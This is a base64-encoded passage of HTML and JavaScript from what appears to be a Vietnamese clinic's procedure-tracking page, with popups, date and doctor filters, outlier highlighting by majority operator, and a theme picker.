RlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncG9wdXBDb250ZW50Jyk7DQogICAgY29uc3QgbGlzdCA9IGFsbFByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5vcGVyYXRvciA9PT0gb3BlcmF0b3IgJiYgcC5kYXRlID09PSBkYXRlKTsNCg0KICAgIGlmIChsaXN0Lmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBjb250ZW50LmlubmVySFRNTCA9ICI8aT5LaMO0bmcgdMOsbSB0aOG6pXkgdGjhu6cgdGh14bqtdDwvaT4iOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGxpc3Quc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KICAgICAgICBjb250ZW50LmlubmVySFRNTCA9ICI8Yj5OZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvYj4gIiArIG9wZXJhdG9yICsgIjxicj48Yj5OZ8OgeTo8L2I+ICIgKyBkYXRlICsgIjxicj48YnI+IiArDQogICAgICAgICAgICAiPHVsIHN0eWxlPSdwYWRkaW5nLWxlZnQ6MjBweCc+IiArIGxpc3QubWFwKHAgPT4gDQogICAgICAgICAgICAgICAgIjxsaT48Yj4iICsgcC5wYXRpZW50TmFtZSArICI8L2I+IC0gIiArIHAucHJvY2VkdXJlICsgIiAoIiArIHAuZGlzcGxheVN0YXJ0ICsgIiDihpIgIiArIHAuZGlzcGxheUVuZCArICIpPC9saT4iDQogICAgICAgICAgICApLmpvaW4oJycpICsgIjwvdWw+IjsNCiAgICB9DQoNCiAgICBvdmVybGF5LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KfQ0KDQpmdW5jdGlvbiBjbG9zZVByb2NlZHVyZVBvcHVwKCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVPdmVybGF5Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCn0NCjwvc2NyaXB0Pg0KPCEtLSBQb3B1cCB0aOG7pyB0aHXhuq10IGNoaSB0aeG6v3QgduG7m2kgb3ZlcmxheSAtLT4NCjxkaXYgaWQ9InByb2NlZHVyZU92ZXJsYXkiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNCk7ei1pbmRleDoxMDAwMCIgb25jbGljaz0iY2xvc2VQcm9jZWR1cmVQb3B1cCgpIj4NCiAgPGRpdiBpZD0icHJvY2VkdXJlUG9wdXAiIG9uY2xpY2s9ImV2ZW50LnN0b3BQcm9wYWdhdGlvbigpIiBzdHlsZT0icG9zaXRpb246cmVsYXRpdmU7dG9wOjEwJTtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTtiYWNrZ3JvdW5kOiNmZmY7Y29sb3I6IzAwMDtib3JkZXI6MnB4IHNvbGlkICMzNDk4ZGI7cGFkZGluZzoyMHB4O2JvcmRlci1yYWRpdXM6OHB4O2JveC1zaGFkb3c6MCA1cHggMjBweCByZ2JhKDAsMCwwLDAuMyk7bWF4LWhlaWdodDo3MHZoO292ZXJmbG93OmF1dG87Zm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZjttYXgtd2lkdGg6NjAwcHgiPg0KICAgIDxoMz5DaGkgdGnhur90IHRo4bunIHRodeG6rXQ8L2gzPg0KICAgIDxkaXYgaWQ9InBvcHVwQ29udGVudCI+PC9kaXY+DQogICAgPGJyLz4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImNsb3NlUHJvY2VkdXJlUG9wdXAoKSI+xJDDs25nPC9idXR0b24+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCg0KDQoNCg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHJlbmRlckhlcmJMaXN0KCkgew0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJUYWJsZUJvZHknKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIGNvbnN0IGhlcmJzID0gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzIHx8IFtdOw0KICAgIGNvbnN0IGRhdGVGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRhdGVGaWx0ZXInKTsNCiAgICBjb25zdCBkb2N0b3JGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRvY3RvckZpbHRlcicpOw0KDQogICAgaWYgKCFkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQpIHsNCiAgICAgICAgY29uc3QgdW5pcXVlRGF0ZXMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaCA9PiBoLmRhdGUpKV0uc29ydCgoYSwgYikgPT4gew0KICAgICAgICAgICAgY29uc3QgW2RhLCBtYSwgeWFdID0gYS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgY29uc3QgW2RiLCBtYiwgeWJdID0gYi5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLCBtYSAtIDEsIGRhKSAtIG5ldyBEYXRlKHliLCBtYiAtIDEsIGRiKTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3QgdW5pcXVlRG9jdG9ycyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoID0+IGguZG9jdG9yIHx8ICdLaMO0bmcgY8OzJykpXS5zb3J0KCk7DQoNCiAgICAgICAgZGF0ZUZpbHRlci5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICB1bmlxdWVEYXRlcy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KDQogICAgICAgIGRvY3RvckZpbHRlci5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjIGLDoWMgc8SpPC9vcHRpb24+JyArDQogICAgICAgICAgICB1bmlxdWVEb2N0b3JzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQoNCiAgICAgICAgZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkID0gInRydWUiOw0KICAgICAgICBkYXRlRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHJlbmRlckhlcmJMaXN0KTsNCiAgICAgICAgZG9jdG9yRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHJlbmRlckhlcmJMaXN0KTsNCiAgICB9DQoNCiAgICBjb25zdCBzZWxlY3RlZERhdGUgPSBkYXRlRmlsdGVyLnZhbHVlOw0KICAgIGNvbnN0IHNlbGVjdGVkRG9jdG9yID0gZG9jdG9yRmlsdGVyLnZhbHVlOw0KDQogICAgY29uc3QgZmlsdGVyZWRIZXJicyA9IGhlcmJzLmZpbHRlcihwID0+DQogICAgICAgIChzZWxlY3RlZERhdGUgPT09ICdhbGwnIHx8IHAuZGF0ZSA9PT0gc2VsZWN0ZWREYXRlKSAmJg0KICAgICAgICAoc2VsZWN0ZWREb2N0b3IgPT09ICdhbGwnIHx8IHAuZG9jdG9yID09PSBzZWxlY3RlZERvY3RvcikNCiAgICApOw0KDQogICAgaWYgKGZpbHRlcmVkSGVyYnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYDx0ZCBjb2xzcGFuPSI1Ij48Y2VudGVyPktow7RuZyBjw7MgZOG7ryBsaeG7h3Ugc+G6r2MgdGh14buRYyB0aGFuZzwvY2VudGVyPjwvdGQ+YDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGZpbHRlcmVkSGVyYnMuZm9yRWFjaChwID0+IHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoImhlcmItcm93Iik7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICA8dGQ+JHtwLnBhdGllbnROYW1lfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5kYXRlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLmRpc3BsYXlTdGFydH0g4oaSICR7cC5kaXNwbGF5RW5kfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCg0KZnVuY3Rpb24gdG9nZ2xlSGVyYkxpc3QoKSB7DQogICAgY29uc3QgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlByb2NlZHVyZVRhYmxlJyk7DQogICAgaWYgKHRhYmxlLnN0eWxlLmRpc3BsYXkgPT09ICdub25lJykgew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgcmVuZGVySGVyYkxpc3QoKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIH0NCn0NCjwvc2NyaXB0Pg0KDQoNCg0KPHNjcmlwdD4NCihmdW5jdGlvbigpew0KICAvKiA9PT09IFRJ4buGTiDDjUNIIENIVeG6qE4gSE/DgSBUw4pOID09PT0gKi8NCiAgZnVuY3Rpb24gY2xlYW5EaXNwbGF5KG5hbWUpew0KICAgIHJldHVybiAobmFtZXx8JycpDQogICAgICAudG9TdHJpbmcoKQ0KICAgICAgLnJlcGxhY2UoL1ss77yMXStccyokLywnJykNCiAgICAgIC5yZXBsYWNlKC9ccysvZywnICcpDQogICAgICAudHJpbSgpOw0KICB9DQogIGZ1bmN0aW9uIG5vcm0obmFtZSl7DQogICAgcmV0dXJuIGNsZWFuRGlzcGxheShuYW1lKS50b0xvd2VyQ2FzZSgpOw0KICB9DQoNCiAgLyogPT09PSBUw41OSCDEkEEgU+G7kCBUSEVPIE5Hw4BZID09PT0gKi8NCiAgZnVuY3Rpb24gY29tcHV0ZU1ham9yaXR5QnlEYXRlKHJvd3Mpew0KICAgIGNvbnN0IG1hcCA9IE9iamVjdC5jcmVhdGUobnVsbCk7DQogICAgcm93cy5mb3JFYWNoKHI9PnsNCiAgICAgIGNvbnN0IGQgPSByLmRhdGU7DQogICAgICBjb25zdCBuID0gbm9ybShyLm9wZXJhdG9yKTsNCiAgICAgIGlmKCFuIHx8IG4gPT09ICdraMO0bmcgY8OzJykgcmV0dXJuOw0KICAgICAgKG1hcFtkXXx8KG1hcFtkXT17fSkpW25dID0gKG1hcFtkXVtuXXx8MCkrMTsNCiAgICB9KTsNCiAgICBjb25zdCBvdXQgPSB7fTsNCiAgICBPYmplY3Qua2V5cyhtYXApLmZvckVhY2goZD0+ew0KICAgICAgY29uc3QgYXJyID0gT2JqZWN0LmVudHJpZXMobWFwW2RdKS5zb3J0KChhLGIpPT5iWzFdLWFbMV0pOw0KICAgICAgY29uc3QgdG9wID0gYXJyWzBdIHx8IFtudWxsLDBdOw0KICAgICAgY29uc3Qgc2Vjb25kID0gYXJyWzFdIHx8IFtudWxsLDBdOw0KICAgICAgb3V0W2RdID0geyB0b3BOb3JtOnRvcFswXSwgdG9wQ291bnQ6dG9wWzFdLCBzZWNvbmRDb3VudDpzZWNvbmRbMV0gfTsNCiAgICB9KTsNCiAgICByZXR1cm4gb3V0Ow0KICB9DQoNCiAgLyogPT09PSBVSSBQSOG7pDogVMOTTSBU4bquVCArIFBPUFVQID09PT0gKi8NCiAgZnVuY3Rpb24gZW5zdXJlT3V0bGllclVJKCl7DQogICAgY29uc3Qgc3VtbWFyeSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllclN1bW1hcnknKTsNCiAgICBjb25zdCBtb2RhbCAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWwnKTsNCiAgICBpZighc3VtbWFyeSkgY29uc29sZS53YXJuKCdUaGnhur91ICNoZXJiT3V0bGllclN1bW1hcnkgdHJvbmcgSFRNTCEnKTsNCiAgICBpZighbW9kYWwpICAgY29uc29sZS53YXJuKCdUaGnhur91ICNoZXJiT3V0bGllck1vZGFsIHRyb25nIEhUTUwhJyk7DQogICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyQ2xvc2VCdG4nKTsNCiAgICBjb25zdCBiYWNrZHJvcCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckJhY2tkcm9wJyk7DQogICAgaWYoYnRuKSBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKT0+bW9kYWwuc3R5bGUuZGlzcGxheT0nbm9uZScpOw0KICAgIGlmKGJhY2tkcm9wKSBiYWNrZHJvcC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT5tb2RhbC5zdHlsZS5kaXNwbGF5PSdub25lJyk7DQogIH0NCiAgZW5zdXJlT3V0bGllclVJKCk7DQoNCiAgLyogPT09PSBHSEkgxJDDiCBIw4BNIFJFTkRFUiA9PT09ICovDQogIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCA9IGZ1bmN0aW9uKCl7DQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRhYmxlQm9keScpOw0KICAgIGNvbnN0IGRhdGVGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRhdGVGaWx0ZXInKTsNCiAgICBjb25zdCBkb2N0b3JGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRvY3RvckZpbHRlcicpOw0KICAgIGNvbnN0IHN1bW1hcnlEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJTdW1tYXJ5Jyk7DQogICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbCcpOw0KICAgIGNvbnN0IG1vZGFsQm9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsQm9keScpOw0KICAgIGNvbnN0IG1vZGFsSW5mbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsSW5mbycpOw0KDQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgICBjb25zdCBoZXJic1JhdyA9IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyB8fCBbXTsNCiAgICBjb25zdCBoZXJicyA9IGhlcmJzUmF3Lm1hcChoPT4oew0KICAgICAgLi4uaCwNCiAgICAgIG9wQ2xlYW46IGNsZWFuRGlzcGxheShoLm9wZXJhdG9yKSwNCiAgICAgIG9wTm9ybTogbm9ybShoLm9wZXJhdG9yKQ0KICAgIH0pKTsNCg0KICAgIGlmKCFkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQpew0KICAgICAgY29uc3QgdW5pcXVlRGF0ZXMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaD0+aC5kYXRlKSldLnNvcnQoKGEsYik9PnsNCiAgICAgICAgY29uc3QgW2RhLG1hLHlhXSA9IGEuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgY29uc3QgW2RiLG1iLHliXSA9IGIuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLG1hLTEsZGEpIC0gbmV3IERhdGUoeWIsbWItMSxkYik7DQogICAgICB9KTsNCiAgICAgIGNvbnN0IHVuaXF1ZURvY3RvcnMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaD0+aC5kb2N0b3J8fCdLaMO0bmcgY8OzJykpXS5zb3J0KCk7DQogICAgICBkYXRlRmlsdGVyLmlubmVySFRNTCA9DQogICAgICAgICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgdW5pcXVlRGF0ZXMubWFwKGQ9PmA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgICBkb2N0b3JGaWx0ZXIuaW5uZXJIVE1MID0NCiAgICAgICAgJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBiw6FjIHPEqTwvb3B0aW9uPicgKw0KICAgICAgICB1bmlxdWVEb2N0b3JzLm1hcChkPT5gPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgICAgZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkID0gJ3RydWUnOw0KICAgICAgZGF0ZUZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB3aW5kb3cucmVuZGVySGVyYkxpc3QpOw0KICAgICAgZG9jdG9yRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCk7DQogICAgfQ0KDQogICAgY29uc3Qgc2VsZWN0ZWREYXRlID0gZGF0ZUZpbHRlci52YWx1ZTsNCiAgICBjb25zdCBzZWxlY3RlZERvY3RvciA9IGRvY3RvckZpbHRlci52YWx1ZTsNCg0KICAgIGNvbnN0IGZpbHRlcmVkID0gaGVyYnMuZmlsdGVyKHAgPT4NCiAgICAgIChzZWxlY3RlZERhdGUgPT09ICdhbGwnIHx8IHAuZGF0ZSA9PT0gc2VsZWN0ZWREYXRlKSAmJg0KICAgICAgKHNlbGVjdGVkRG9jdG9yID09PSAnYWxsJyB8fCBwLmRvY3RvciA9PT0gc2VsZWN0ZWREb2N0b3IpDQogICAgKTsNCg0KICAgIGlmKGZpbHRlcmVkLmxlbmd0aCA9PT0gMCl7DQogICAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICB0ci5jbGFzc05hbWUgPSAnaGVyYi1yb3cnOw0KICAgICAgdHIuaW5uZXJIVE1MID0gJzx0ZCBjb2xzcGFuPSI1Ij48Y2VudGVyPktow7RuZyBjw7MgZOG7ryBsaeG7h3Ugc+G6r2MgdGh14buRYyB0aGFuZzwvY2VudGVyPjwvdGQ+JzsNCiAgICAgIHRib2R5LmFwcGVuZENoaWxkKHRyKTsNCiAgICAgIGlmKHN1bW1hcnlEaXYpIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheT0nbm9uZSc7DQogICAgICByZXR1cm47DQogICAgfQ0KDQogICAgY29uc3QgbWFqb3JpdHkgPSBjb21wdXRlTWFqb3JpdHlCeURhdGUoaGVyYnMpOw0KICAgIGNvbnN0IG91dGxpZXJzSW5WaWV3ID0gW107DQoNCiAgICBmaWx0ZXJlZC5mb3JFYWNoKHA9PnsNCiAgICAgIGNvbnN0IHRyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgIHRyLmNsYXNzTmFtZSA9ICdoZXJiLXJvdyc7DQogICAgICBjb25zdCBtID0gbWFqb3JpdHlbcC5kYXRlXTsNCiAgICAgIGNvbnN0IGhhc01ham9yaXR5ID0gbSAmJiBtLnRvcE5vcm0gJiYgbS50b3BDb3VudCA+IG0uc2Vjb25kQ291bnQ7DQogICAgICBpZihoYXNNYWpvcml0eSAmJiBwLm9wTm9ybSAhPT0gbS50b3BOb3JtKXsNCiAgICAgICAgdHIuY2xhc3NMaXN0LmFkZCgnaGVyYi1vdXRsaWVyJyk7DQogICAgICAgIG91dGxpZXJzSW5WaWV3LnB1c2gocCk7DQogICAgICB9DQogICAgICB0ci5pbm5lckhUTUwgPSBgDQogICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9PC90ZD4NCiAgICAgICAgPHRkPiR7cC5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgPHRkPiR7cC5kYXRlfTwvdGQ+DQogICAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSAmcmFycjsgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgICAgPHRkPiR7cC5vcENsZWFufTwvdGQ+DQogICAgICBgOw0KICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICAgIH0pOw0KDQogICAgaWYoc3VtbWFyeURpdil7DQogICAgICBpZihvdXRsaWVyc0luVmlldy5sZW5ndGgpew0KICAgICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J2Jsb2NrJzsNCiAgICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUwgPQ0KICAgICAgICAgIGA8YSBocmVmPSIjIiBpZD0iaGVyYk91dGxpZXJDb3VudExpbmsiPkPDsyAke291dGxpZXJzSW5WaWV3Lmxlbmd0aH0gY2EgY8OzIHbhuqVuIMSR4buBIHRyb25nIGRhbmggc8OhY2ggbsOgeS48L2E+YDsNCiAgICAgICAgY29uc3QgbGluayA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckNvdW50TGluaycpOw0KICAgICAgICBsaW5rLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oZXYpew0KICAgICAgICAgIGV2LnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgICAgaWYobW9kYWxCb2R5KXsNCiAgICAgICAgICAgIG1vZGFsQm9keS5pbm5lckhUTUwgPSAnJzsNCiAgICAgICAgICAgIG91dGxpZXJzSW5WaWV3LmZvckVhY2gocD0+ew0KICAgICAgICAgICAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICAgIHRyLmlubmVySFRNTCA9IGANCiAgICAgICAgICAgICAgICA8dGQ+JHtwLnBhdGllbnROYW1lfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cC5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwLmRpc3BsYXlTdGFydH0gJnJhcnI7ICR7cC5kaXNwbGF5RW5kfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cC5vcENsZWFufTwvdGQ+DQogICAgICAgICAgICAgIGA7DQogICAgICAgICAgICAgIG1vZGFsQm9keS5hcHBlbmRDaGlsZCh0cik7DQogICAgICAgICAgICB9KTsNCiAgICAgICAgICB9DQogICAgICAgICAgaWYobW9kYWxJbmZvKXsNCiAgICAgICAgICAgIGNvbnN0IG5vdGVEYXRlID0gKHNlbGVjdGVkRGF0ZT09PSdhbGwnKSA/ICduaGnhu4F1IG5nw6B5JyA6IHNlbGVjdGVkRGF0ZTsNCiAgICAgICAgICAgIG1vZGFsSW5mby50ZXh0Q29udGVudCA9IGBU4buVbmcgJHtvdXRsaWVyc0luVmlldy5sZW5ndGh9IGNhIGtow6FjIMSRYSBz4buRICgke25vdGVEYXRlfSkuYDsNCiAgICAgICAgICB9DQogICAgICAgICAgaWYobW9kYWwpIG1vZGFsLnN0eWxlLmRpc3BsYXk9J2Jsb2NrJzsNCiAgICAgICAgfSwge29uY2U6dHJ1ZX0pOw0KICAgICAgfSBlbHNlIHsNCiAgICAgICAgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUw9Jyc7DQogICAgICB9DQogICAgfQ0KICB9Ow0KDQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKT0+ew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJQcm9jZWR1cmVUYWJsZScpOw0KICAgIGlmKHRhYmxlICYmIHRhYmxlLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJyl7DQogICAgICB3aW5kb3cucmVuZGVySGVyYkxpc3QoKTsNCiAgICB9DQogIH0pOw0KfSkoKTsNCg0KDQoNCg0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24gKCkgew0KICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCiAgICBjb25zdCBhbmFseXplQnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKTsNCiAgICBpZiAoZmlsZUlucHV0ICYmIGFuYWx5emVCdG4pIHsNCiAgICAgIGZpbGVJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAgICAgIGFuYWx5emVCdG4uY2xpY2soKTsNCiAgICAgIH0pOw0KICAgIH0NCiAgfSk7DQo8L3NjcmlwdD4NCg0KDQo8IS0tIFRIRU1FIFBJQ0tFUiBTQ1JJUFQgLS0+DQo8c2NyaXB0Pg0KKGZ1bmN0aW9uKCl7DQogIGNvbnN0IFRIRU1FX0tFWSA9ICd1aUFjY2VudFRoZW1lJzsNCiAgY29uc3QgYm9keSA9IGRvY3VtZW50LmJvZHk7DQogIGNvbnN0IHBpY2tlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aGVtZVBpY2tlcicpOw0KICBpZighcGlja2VyKSByZXR1cm47DQogIGZ1bmN0aW9uIGFwcGx5VGhlbWUodCl7DQogICAgYm9keS5jbGFzc0xpc3QucmVtb3ZlKCd0aGVtZS1kZWZhdWx0JywndGhlbWUtb3JhbmdlJywndGhlbWUtcmVkJywndGhlbWUtZ3JlZW4nKTsNCiAgICBpZih0ICYmIHQgIT09ICdkZWZhdWx0Jyl7DQogICAgICBib2R5LmNsYXNzTGlzdC5hZGQoJ3RoZW1lLScrdCk7DQogICAgfSBlbHNlIHsNCiAgICAgIGJvZHkuY2xhc3NMaXN0LmFkZCgndGhlbWUtZGVmYXVsdCcpOyAvLyBleHBsaWNpdCDEkeG7gyBhY3RpdmUgcmluZw0KICAgIH0NCiAgICBwaWNrZXIucXVlcnlTZWxlY3RvckFsbCgnLnRoZW1lLXN3YXRjaCcpLmZvckVhY2goYnRuPT57DQogICAgICBidG4uY2xhc3NMaXN0LnRvZ2dsZSgnaXMtYWN0aXZlJywgYnRuLmRhdGFzZXQudGhlbWU9PT10IHx8ICh0PT09JycgJiYgYnRuLmRhdGFzZXQudGhlbWU9PT0nZGVmYXVsdCcpKTsNCiAgICB9KTsNCiAgICB0cnl7IGxvY2FsU3RvcmFnZS5zZXRJdGVtKFRIRU1FX0tFWSx0fHwnZGVmYXVsdCcpOyB9Y2F0Y2goZSl7fQ0KICB9DQogIGNvbnN0IHNhdmVkID0gKGZ1bmN0aW9uKCl7dHJ5e3JldHVybiBsb2NhbFN0b3JhZ2UuZ2V0SXRlbShUSEVNRV9LRVkpIHx8ICdkZWZhdWx0Jzt9Y2F0Y2goZSl7cmV0dXJuICdkZWZhdWx0Jzt9fSkoKTsNCiAgYXBwbHlUaGVtZShzYXZlZCk7DQogIHBpY2tlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZT0+ew0KICAgIGNvbnN0IGJ0biA9IGUudGFyZ2V0LmNsb3Nlc3QoJy50aGVtZS1zd2F0Y2gnKTsNCiAgICBpZighYnRuKSByZXR1cm47DQogICAgYXBwbHlUaGVtZShidG4uZGF0YXNldC50aGVtZSk7DQogIH0pOw0KfSkoKTsNCjwvc2NyaXB0Pg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gdXBkYXRlSGVyYkJ1dHRvbldpdGhPdXRsaWVyQ291bnQoKSB7DQogIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVG9nZ2xlQnRuJyk7DQogIGlmICghYnRuIHx8ICF3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMpIHJldHVybjsNCg0KICBjb25zdCBoZXJicyA9IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlczsNCiAgY29uc3QgY291bnRzID0ge307DQoNCiAgaGVyYnMuZm9yRWFjaChoID0+IHsNCiAgICBjb25zdCBkYXRlID0gaC5kYXRlOw0K